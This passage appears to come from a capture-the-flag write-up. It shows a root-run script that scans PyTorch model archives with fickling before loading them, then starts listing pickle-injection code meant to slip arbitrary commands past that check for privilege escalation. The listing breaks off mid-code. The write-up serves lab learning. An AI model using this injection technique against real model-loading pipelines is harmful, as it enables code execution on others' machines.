&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> /usr/bin/tar -xf &lt;span style="color:#b8bb26">&amp;#34;&lt;/span>$MODEL_FILE&lt;span style="color:#b8bb26">&amp;#34;&lt;/span> -C &lt;span style="color:#b8bb26">&amp;#34;&lt;/span>$TEMP_DIR&lt;span style="color:#b8bb26">&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#fe8019">elif&lt;/span> &lt;span style="color:#fe8019">[[&lt;/span> &lt;span style="color:#b8bb26">&amp;#34;&lt;/span>$file_type&lt;span style="color:#b8bb26">&amp;#34;&lt;/span> &lt;span style="color:#fe8019">==&lt;/span> *&lt;span style="color:#b8bb26">&amp;#34;Zip archive data&amp;#34;&lt;/span>* &lt;span style="color:#fe8019">]]&lt;/span>; &lt;span style="color:#fe8019">then&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#928374;font-style:italic"># Zip archive (newer PyTorch format)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> /usr/bin/unzip -q &lt;span style="color:#b8bb26">&amp;#34;&lt;/span>$MODEL_FILE&lt;span style="color:#b8bb26">&amp;#34;&lt;/span> -d &lt;span style="color:#b8bb26">&amp;#34;&lt;/span>$TEMP_DIR&lt;span style="color:#b8bb26">&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#fe8019">else&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> /usr/bin/echo &lt;span style="color:#b8bb26">&amp;#34;[!] Unknown or unsupported file format for &lt;/span>$MODEL_FILE&lt;span style="color:#b8bb26">&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#fabd2f">exit&lt;/span> &lt;span style="color:#d3869b">2&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#fe8019">fi&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>/usr/bin/find &lt;span style="color:#b8bb26">&amp;#34;&lt;/span>$TEMP_DIR&lt;span style="color:#b8bb26">&amp;#34;&lt;/span> -type f &lt;span style="color:#b8bb26">\(&lt;/span> -name &lt;span style="color:#b8bb26">&amp;#34;*.pkl&amp;#34;&lt;/span> -o -name &lt;span style="color:#b8bb26">&amp;#34;pickle&amp;#34;&lt;/span> &lt;span style="color:#b8bb26">\)&lt;/span> -print0 | &lt;span style="color:#fe8019">while&lt;/span> IFS&lt;span style="color:#fe8019">=&lt;/span> &lt;span style="color:#fabd2f">read&lt;/span> -r -d &lt;span style="color:#b8bb26">$&amp;#39;\0&amp;#39;&lt;/span> extracted_pkl; &lt;span style="color:#fe8019">do&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> fickling_output&lt;span style="color:#fe8019">=&lt;/span>&lt;span style="color:#fe8019">$(&lt;/span>/usr/local/bin/fickling -s --json-output /dev/fd/1 &lt;span style="color:#b8bb26">&amp;#34;&lt;/span>$extracted_pkl&lt;span style="color:#b8bb26">&amp;#34;&lt;/span>&lt;span style="color:#fe8019">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#fe8019">if&lt;/span> /usr/bin/echo &lt;span style="color:#b8bb26">&amp;#34;&lt;/span>$fickling_output&lt;span style="color:#b8bb26">&amp;#34;&lt;/span> | /usr/bin/jq -e &lt;span style="color:#b8bb26">&amp;#39;select(.severity == &amp;#34;OVERTLY_MALICIOUS&amp;#34;)&amp;#39;&lt;/span> &amp;gt;/dev/null; &lt;span style="color:#fe8019">then&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> /usr/bin/echo &lt;span style="color:#b8bb26">&amp;#34;[!] Model &lt;/span>$MODEL_FILE&lt;span style="color:#b8bb26"> contains OVERTLY_MALICIOUS components and will be deleted.&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> /bin/rm &lt;span style="color:#b8bb26">&amp;#34;&lt;/span>$MODEL_FILE&lt;span style="color:#b8bb26">&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#fabd2f">break&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#fe8019">fi&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#fe8019">done&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>/usr/bin/find &lt;span style="color:#b8bb26">&amp;#34;&lt;/span>$TEMP_DIR&lt;span style="color:#b8bb26">&amp;#34;&lt;/span> -type f -exec /bin/rm &lt;span style="color:#fe8019">{}&lt;/span> +
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>/bin/rm -rf &lt;span style="color:#b8bb26">&amp;#34;&lt;/span>$TEMP_DIR&lt;span style="color:#b8bb26">&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#fe8019">if&lt;/span> &lt;span style="color:#fe8019">[&lt;/span> -f &lt;span style="color:#b8bb26">&amp;#34;&lt;/span>$MODEL_FILE&lt;span style="color:#b8bb26">&amp;#34;&lt;/span> &lt;span style="color:#fe8019">]&lt;/span>; &lt;span style="color:#fe8019">then&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> /usr/bin/echo &lt;span style="color:#b8bb26">&amp;#34;[+] Model &lt;/span>$MODEL_FILE&lt;span style="color:#b8bb26"> is considered safe. Processing...&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> /usr/bin/python3 &lt;span style="color:#b8bb26">&amp;#34;&lt;/span>$PYTHON_SCRIPT&lt;span style="color:#b8bb26">&amp;#34;&lt;/span> &lt;span style="color:#b8bb26">&amp;#34;&lt;/span>$MODEL_FILE&lt;span style="color:#b8bb26">&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#fe8019">fi&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>The file requires one argument, which is the location of the model file. The model file should be in either &lt;code>tar&lt;/code> or &lt;code>zip&lt;/code> format.
It then extracts the archive in &lt;code>/opt/temp&lt;/code>. It then uses a static code analyzer called &lt;code>fickling&lt;/code> to check if any of the serialized pickle files extracted in &lt;code>/opt/temp&lt;/code> is malicious.
If everything is fine, it finally runs &lt;code>/models/evaluate_models.py&lt;/code> script with the model file as its argument.&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#ebdbb2;background-color:#282828;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-python" data-lang="python">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#fe8019">import&lt;/span> torch
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#fe8019">import&lt;/span> torch.nn &lt;span style="color:#fe8019">as&lt;/span> nn
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#fe8019">from&lt;/span> torchvision &lt;span style="color:#fe8019">import&lt;/span> transforms
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#fe8019">from&lt;/span> torchvision.datasets &lt;span style="color:#fe8019">import&lt;/span> CIFAR10
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#fe8019">from&lt;/span> torch.utils.data &lt;span style="color:#fe8019">import&lt;/span> DataLoader, Subset
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#fe8019">import&lt;/span> numpy &lt;span style="color:#fe8019">as&lt;/span> np
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#fe8019">import&lt;/span> sys
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#fe8019">class&lt;/span> CustomCNN(nn&lt;span style="color:#fe8019">.&lt;/span>Module):
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#fe8019">def&lt;/span> __init__(self):
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#fabd2f">super&lt;/span>(CustomCNN, self)&lt;span style="color:#fe8019">.&lt;/span>__init__()
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> self&lt;span style="color:#fe8019">.&lt;/span>conv1 &lt;span style="color:#fe8019">=&lt;/span> nn&lt;span style="color:#fe8019">.&lt;/span>Conv2d(in_channels&lt;span style="color:#fe8019">=&lt;/span>&lt;span style="color:#d3869b">3&lt;/span>, out_channels&lt;span style="color:#fe8019">=&lt;/span>&lt;span style="color:#d3869b">16&lt;/span>, kernel_size&lt;span style="color:#fe8019">=&lt;/span>&lt;span style="color:#d3869b">3&lt;/span>, padding&lt;span style="color:#fe8019">=&lt;/span>&lt;span style="color:#d3869b">1&lt;/span>)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> self&lt;span style="color:#fe8019">.&lt;/span>conv2 &lt;span style="color:#fe8019">=&lt;/span> nn&lt;span style="color:#fe8019">.&lt;/span>Conv2d(in_channels&lt;span style="color:#fe8019">=&lt;/span>&lt;span style="color:#d3869b">16&lt;/span>, out_channels&lt;span style="color:#fe8019">=&lt;/span>&lt;span style="color:#d3869b">32&lt;/span>, kernel_size&lt;span style="color:#fe8019">=&lt;/span>&lt;span style="color:#d3869b">3&lt;/span>, padding&lt;span style="color:#fe8019">=&lt;/span>&lt;span style="color:#d3869b">1&lt;/span>)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> self&lt;span style="color:#fe8019">.&lt;/span>pool &lt;span style="color:#fe8019">=&lt;/span> nn&lt;span style="color:#fe8019">.&lt;/span>MaxPool2d(kernel_size&lt;span style="color:#fe8019">=&lt;/span>&lt;span style="color:#d3869b">2&lt;/span>, stride&lt;span style="color:#fe8019">=&lt;/span>&lt;span style="color:#d3869b">2&lt;/span>, padding&lt;span style="color:#fe8019">=&lt;/span>&lt;span style="color:#d3869b">0&lt;/span>)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> self&lt;span style="color:#fe8019">.&lt;/span>fc1 &lt;span style="color:#fe8019">=&lt;/span> nn&lt;span style="color:#fe8019">.&lt;/span>Linear(in_features&lt;span style="color:#fe8019">=&lt;/span>&lt;span style="color:#d3869b">32&lt;/span> &lt;span style="color:#fe8019">*&lt;/span> &lt;span style="color:#d3869b">8&lt;/span> &lt;span style="color:#fe8019">*&lt;/span> &lt;span style="color:#d3869b">8&lt;/span>, out_features&lt;span style="color:#fe8019">=&lt;/span>&lt;span style="color:#d3869b">128&lt;/span>)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> self&lt;span style="color:#fe8019">.&lt;/span>fc2 &lt;span style="color:#fe8019">=&lt;/span> nn&lt;span style="color:#fe8019">.&lt;/span>Linear(in_features&lt;span style="color:#fe8019">=&lt;/span>&lt;span style="color:#d3869b">128&lt;/span>, out_features&lt;span style="color:#fe8019">=&lt;/span>&lt;span style="color:#d3869b">10&lt;/span>)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> self&lt;span style="color:#fe8019">.&lt;/span>relu &lt;span style="color:#fe8019">=&lt;/span> nn&lt;span style="color:#fe8019">.&lt;/span>ReLU()
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#fe8019">def&lt;/span> &lt;span style="color:#fabd2f">forward&lt;/span>(self, x):
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> x &lt;span style="color:#fe8019">=&lt;/span> self&lt;span style="color:#fe8019">.&lt;/span>pool(self&lt;span style="color:#fe8019">.&lt;/span>relu(self&lt;span style="color:#fe8019">.&lt;/span>conv1(x)))
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> x &lt;span style="color:#fe8019">=&lt;/span> self&lt;span style="color:#fe8019">.&lt;/span>pool(self&lt;span style="color:#fe8019">.&lt;/span>relu(self&lt;span style="color:#fe8019">.&lt;/span>conv2(x)))
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> x &lt;span style="color:#fe8019">=&lt;/span> x&lt;span style="color:#fe8019">.&lt;/span>view(&lt;span style="color:#fe8019">-&lt;/span>&lt;span style="color:#d3869b">1&lt;/span>, &lt;span style="color:#d3869b">32&lt;/span> &lt;span style="color:#fe8019">*&lt;/span> &lt;span style="color:#d3869b">8&lt;/span> &lt;span style="color:#fe8019">*&lt;/span> &lt;span style="color:#d3869b">8&lt;/span>)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> x &lt;span style="color:#fe8019">=&lt;/span> self&lt;span style="color:#fe8019">.&lt;/span>relu(self&lt;span style="color:#fe8019">.&lt;/span>fc1(x))
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> x &lt;span style="color:#fe8019">=&lt;/span> self&lt;span style="color:#fe8019">.&lt;/span>fc2(x)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#fe8019">return&lt;/span> x
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#fe8019">def&lt;/span> &lt;span style="color:#fabd2f">load_model&lt;/span>(model_path):
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> model &lt;span style="color:#fe8019">=&lt;/span> CustomCNN()
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> state_dict &lt;span style="color:#fe8019">=&lt;/span> torch&lt;span style="color:#fe8019">.&lt;/span>load(model_path)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> model&lt;span style="color:#fe8019">.&lt;/span>load_state_dict(state_dict)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> model&lt;span style="color:#fe8019">.&lt;/span>eval()
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#fe8019">return&lt;/span> model
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#fe8019">def&lt;/span> &lt;span style="color:#fabd2f">prepare_dataloader&lt;/span>(batch_size&lt;span style="color:#fe8019">=&lt;/span>&lt;span style="color:#d3869b">32&lt;/span>):
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> transform &lt;span style="color:#fe8019">=&lt;/span> transforms&lt;span style="color:#fe8019">.&lt;/span>Compose([
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> transforms&lt;span style="color:#fe8019">.&lt;/span>RandomHorizontalFlip(),
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> transforms&lt;span style="color:#fe8019">.&lt;/span>RandomCrop(&lt;span style="color:#d3869b">32&lt;/span>, padding&lt;span style="color:#fe8019">=&lt;/span>&lt;span style="color:#d3869b">4&lt;/span>),
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> transforms&lt;span style="color:#fe8019">.&lt;/span>ToTensor(),
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> transforms&lt;span style="color:#fe8019">.&lt;/span>Normalize(mean&lt;span style="color:#fe8019">=&lt;/span>[&lt;span style="color:#d3869b">0.4914&lt;/span>, &lt;span style="color:#d3869b">0.4822&lt;/span>, &lt;span style="color:#d3869b">0.4465&lt;/span>], std&lt;span style="color:#fe8019">=&lt;/span>[&lt;span style="color:#d3869b">0.2023&lt;/span>, &lt;span style="color:#d3869b">0.1994&lt;/span>, &lt;span style="color:#d3869b">0.2010&lt;/span>]),
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> ])
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> dataset &lt;span style="color:#fe8019">=&lt;/span> CIFAR10(root&lt;span style="color:#fe8019">=&lt;/span>&lt;span style="color:#b8bb26">&amp;#39;/root/datasets/&amp;#39;&lt;/span>, train&lt;span style="color:#fe8019">=&lt;/span>&lt;span style="color:#fe8019">False&lt;/span>, download&lt;span style="color:#fe8019">=&lt;/span>&lt;span style="color:#fe8019">False&lt;/span>, transform&lt;span style="color:#fe8019">=&lt;/span>transform)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> subset &lt;span style="color:#fe8019">=&lt;/span> Subset(dataset, indices&lt;span style="color:#fe8019">=&lt;/span>np&lt;span style="color:#fe8019">.&lt;/span>random&lt;span style="color:#fe8019">.&lt;/span>choice(&lt;span style="color:#fabd2f">len&lt;/span>(dataset), &lt;span style="color:#d3869b">64&lt;/span>, replace&lt;span style="color:#fe8019">=&lt;/span>&lt;span style="color:#fe8019">False&lt;/span>))
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> dataloader &lt;span style="color:#fe8019">=&lt;/span> DataLoader(subset, batch_size&lt;span style="color:#fe8019">=&lt;/span>batch_size, shuffle&lt;span style="color:#fe8019">=&lt;/span>&lt;span style="color:#fe8019">False&lt;/span>)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#fe8019">return&lt;/span> dataloader
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#fe8019">def&lt;/span> &lt;span style="color:#fabd2f">evaluate_model&lt;/span>(model, dataloader):
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> correct &lt;span style="color:#fe8019">=&lt;/span> &lt;span style="color:#d3869b">0&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> total &lt;span style="color:#fe8019">=&lt;/span> &lt;span style="color:#d3869b">0&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#fe8019">with&lt;/span> torch&lt;span style="color:#fe8019">.&lt;/span>no_grad():
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#fe8019">for&lt;/span> images, labels &lt;span style="color:#fe8019">in&lt;/span> dataloader:
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> outputs &lt;span style="color:#fe8019">=&lt;/span> model(images)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> _, predicted &lt;span style="color:#fe8019">=&lt;/span> torch&lt;span style="color:#fe8019">.&lt;/span>max(outputs&lt;span style="color:#fe8019">.&lt;/span>data, &lt;span style="color:#d3869b">1&lt;/span>)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> total &lt;span style="color:#fe8019">+=&lt;/span> labels&lt;span style="color:#fe8019">.&lt;/span>size(&lt;span style="color:#d3869b">0&lt;/span>)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> correct &lt;span style="color:#fe8019">+=&lt;/span> (predicted &lt;span style="color:#fe8019">==&lt;/span> labels)&lt;span style="color:#fe8019">.&lt;/span>sum()&lt;span style="color:#fe8019">.&lt;/span>item()
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> accuracy &lt;span style="color:#fe8019">=&lt;/span> &lt;span style="color:#d3869b">100&lt;/span> &lt;span style="color:#fe8019">*&lt;/span> correct &lt;span style="color:#fe8019">/&lt;/span> total
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#fabd2f">print&lt;/span>(&lt;span style="color:#b8bb26">f&lt;/span>&lt;span style="color:#b8bb26">&amp;#39;[+] Accuracy of the model on the test dataset: &lt;/span>&lt;span style="color:#b8bb26">{&lt;/span>accuracy&lt;span style="color:#b8bb26">:&lt;/span>&lt;span style="color:#b8bb26">.2f&lt;/span>&lt;span style="color:#b8bb26">}&lt;/span>&lt;span style="color:#b8bb26">%&amp;#39;&lt;/span>)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#fe8019">def&lt;/span> &lt;span style="color:#fabd2f">main&lt;/span>(model_path):
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> model &lt;span style="color:#fe8019">=&lt;/span> load_model(model_path)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#fabd2f">print&lt;/span>(&lt;span style="color:#b8bb26">&amp;#34;[+] Loaded Model.&amp;#34;&lt;/span>)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> dataloader &lt;span style="color:#fe8019">=&lt;/span> prepare_dataloader()
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#fabd2f">print&lt;/span>(&lt;span style="color:#b8bb26">&amp;#34;[+] Dataloader ready. Evaluating model...&amp;#34;&lt;/span>)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> evaluate_model(model, dataloader)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#fe8019">if&lt;/span> __name__ &lt;span style="color:#fe8019">==&lt;/span> &lt;span style="color:#b8bb26">&amp;#34;__main__&amp;#34;&lt;/span>:
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#fe8019">if&lt;/span> &lt;span style="color:#fabd2f">len&lt;/span>(sys&lt;span style="color:#fe8019">.&lt;/span>argv) &lt;span style="color:#fe8019">&amp;lt;&lt;/span> &lt;span style="color:#d3869b">2&lt;/span>:
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#fabd2f">print&lt;/span>(&lt;span style="color:#b8bb26">&amp;#34;Usage: python script.py &amp;lt;path_to_model.pth&amp;gt;&amp;#34;&lt;/span>)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#fe8019">else&lt;/span>:
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> model_path &lt;span style="color:#fe8019">=&lt;/span> sys&lt;span style="color:#fe8019">.&lt;/span>argv[&lt;span style="color:#d3869b">1&lt;/span>] &lt;span style="color:#928374;font-style:italic"># Path to the .pth file&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> main(model_path)
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>In order for us to load a malicious pickle file and run arbitrary commands, we need to create a pickle file that bypasses the checks of&lt;code>fickling&lt;/code>.
After some searching, I found another blog by Hiddenlayer: &lt;a href="https://hiddenlayer.com/research/weaponizing-machine-learning-models-with-ransomware/">Weaponizing ML Models with Ransomware&lt;/a>. The blog post explains some techniques which we can use to modify exisitng models to execute arbitrary commands.
There&amp;rsquo;s already a pretrained PyTorch model in the &lt;code>/models&lt;/code> directory. &lt;code>.pth&lt;/code> files are used in PyTorch to sore model weights and other relevant infomation for deep learning models. If we extract the &lt;code>demo_model.pth&lt;/code> file we can see there&amp;rsquo;s a &lt;code>data.pkl&lt;/code> file inside it.&lt;/p>
&lt;figure>
&lt;img src="https://h4r1337.github.io/img/blurry/Pasted%20image%2020241013170347.webp">&lt;/figure>
&lt;p>We can inject the model’s &lt;code>data.pkl&lt;/code> file with an instruction to execute arbitrary code using the python script from the blog.&lt;/p>
&lt;h3 id="privilege-escalation-1">Privilege Escalation&lt;/h3>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#ebdbb2;background-color:#282828;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-python" data-lang="python">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#fe8019">import&lt;/span> os
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#fe8019">import&lt;/span> argparse
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#fe8019">import&lt;/span> pickle
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#fe8019">import&lt;/span> struct
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#fe8019">import&lt;/span> shutil
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#fe8019">from&lt;/span> pathlib &lt;span style="color:#fe8019">import&lt;/span> Path
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#fe8019">import&lt;/span> torch
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#fe8019">class&lt;/span> PickleInject():
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#b8bb26">&amp;#34;&amp;#34;&amp;#34;Pickle injection. Pretends to be a &amp;#34;module&amp;#34; to work with torch.&amp;#34;&amp;#34;&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#fe8019">def&lt;/span> __init__(self, inj_objs, first&lt;span style="color:#fe8019">=&lt;/span>&lt;span style="color:#fe8019">True&lt;/span>):
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> self&lt;span style="color:#fe8019">.&lt;/span>__name__ &lt;span style="color:#fe8019">=&lt;/span> &lt;span style="color:#b8bb26">&amp;#34;pickle_inject&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> self&lt;span style="color:#fe8019">.&lt;/span>inj_objs &lt;span style="color:#fe8019">=&lt;/span> inj_objs
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> self&lt;span style="color:#fe8019">.&lt;/span>first &lt;span style="color:#fe8019">=&lt;/span> first
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#fe8019">class&lt;/span> _Pickler(pickle&lt;span style="color:#fe8019">.&lt;/span>_Pickler):
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#b8bb26">&amp;#34;&amp;#34;&amp;#34;Reimplementation of Pickler with support for injection&amp;#34;&amp;#34;&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#fe8019">def&lt;/span> __init__(self, file, protocol, inj_objs, first&lt;span style="color:#fe8019">=&lt;/span>&lt;span style="color:#fe8019">True&lt;/span>):
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#fabd2f">super&lt;/span>()&lt;span style="color:#fe8019">.&lt;/span>__init__(file, protocol)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> self&lt;span style="color:#fe8019">.&lt;/span>inj_objs &lt;span style="color:#fe8019">=&lt;/span> inj_objs
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> self&lt;span style="color:#fe8019">.&lt;/span>first &lt;span style="color:#fe8019">=&lt;/span> first
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#fe8019">def&lt;/span> &lt;span style="color:#fabd2f">dump&lt;/span>(self, obj):
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#b8bb26">&amp;#34;&amp;#34;&amp;#34;Pickle data, inject object before or after&amp;#34;&amp;#34;&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#fe8019">if&lt;/span> self&lt;span style="color:#fe8019">.&lt;/span>proto &lt;span style="color:#fe8019">&amp;gt;=&lt;/span> &lt;span style="color:#d3869b">2&lt;/span>:
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> self&lt;span style="color:#fe8019">.&lt;/span>write(pickle&lt;span style="color:#fe8019">.&lt;/span>PROTO &lt;span style="color:#fe8019">+&lt;/span> struct&lt;span style="color:#fe8019">.&lt;/span>pack(&lt;span style="color:#b8bb26">&amp;#34;&amp;lt;B&amp;#34;&lt;/span>, self&lt;span style="color:#fe8019">.&lt;/span>proto))
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#fe8019">if&lt;/span> self&lt;span style="color:#fe8019">.&lt;/span>proto &lt;span style="color:#fe8019">&amp;gt;=&lt;/span> &lt;span style="color:#d3869b">4&lt;/span>:
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> self&lt;span style="color:#fe8019">.&lt;/span>framer&lt;span style="color:#fe8019">.&lt;/span>start_framing()
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
